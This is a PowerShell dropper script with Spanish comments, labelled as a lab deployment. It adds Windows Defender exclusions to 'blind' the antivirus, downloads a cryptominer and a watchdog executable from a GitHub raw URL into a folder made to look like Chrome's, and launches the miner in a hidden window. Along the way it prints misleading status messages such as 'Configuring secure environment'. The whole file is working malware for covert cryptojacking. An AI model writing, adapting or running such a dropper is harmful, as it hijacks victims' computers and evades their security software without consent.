# dropper.ps1 - Despliegue Silencioso para Entorno de Laboratorio
$ErrorActionPreference = "SilentlyContinue"

# 1. Configuración de Rutas y Credenciales
$userName = "AlmightyDaemon"
$repoName = "Google"
$baseUrl = "https://raw.githubusercontent.com/$userName/$repoName/main"
$installDir = "$env:LOCALAPPDATA\Google\Chrome"
$minerName = "GUpdate.exe"
$watchdogName = "GUpdateTask.exe"

# 2. Cegar a Windows Defender (Requiere Admin)
Write-Host "Configurando entorno seguro..."
Add-MpPreference -ExclusionPath $installDir -Force
Add-MpPreference -ExclusionProcess $minerName -Force
Add-MpPreference -ExclusionProcess $watchdogName -Force

# 3. Crear directorio de instalación
if (-not (Test-Path $installDir)) {
    New-Item -Path $installDir -ItemType Directory -Force | Out-Null
}

# 4. Descarga Silenciosa
Write-Host "Sincronizando componentes..."
$minerPath = Join-Path $installDir $minerName
$watchdogPath = Join-Path $installDir $watchdogName

Invoke-WebRequest -Uri "$baseUrl/$minerName" -OutFile $minerPath -UseBasicParsing
Invoke-WebRequest -Uri "$baseUrl/$watchdogName" -OutFile $watchdogPath -UseBasicParsing

# 5. Ejecución en segundo plano
if (Test-Path $minerPath) {
    Write-Host "Iniciando servicio..."
    Start-Process -FilePath $minerPath -WorkingDirectory $installDir -WindowStyle Hidden
}

Write-Host "Despliegue completado."
